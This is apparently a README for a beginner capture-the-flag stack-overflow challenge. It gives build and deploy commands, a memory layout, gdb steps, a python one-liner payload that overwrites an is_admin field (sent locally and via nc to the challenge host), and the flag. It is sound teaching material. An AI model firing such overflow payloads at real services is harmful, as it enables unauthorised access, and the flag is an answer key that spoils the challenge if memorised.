# baby-stack
## desc
Program ini digunakan untuk mengecek apakah seorang user adalah admin atau bukan.
Admin bisa melihat flag, sedangkan user biasa tidak.

Sepertinya pengecekan ini cukup sederhana… terlalu sederhana?

## chall
```bash
gcc baby-stack.c -o baby-stack -fno-stack-protector -no-pie

docker build -t baby-stack .
docker run -p 9001:9001 baby-stack

docker-compose up -d
```

### up in vps
```bash
sftp . aria@s1.ariaf.my.id:/home/aria/fgte/baby-stack/
```

## solution
- [ username (16 byte) ][ is_admin (4 byte) ]
-

```bash
gdb ./baby-stack
disas main
info frame
```

```bash
python3 -c "print('A'*16 + '\x01\x00\x00\x00')" | ./baby-stack
python3 -c "print('A'*16 + '\x01\x00\x00\x00')" | nc s1.ariaf.my.id 9001
AAAAAAAAAAAAAAAA\x01
```

## flag
FGTE{B4bY_sT4ck_0verflow_1s_V3ry_D4ng3r0us!}
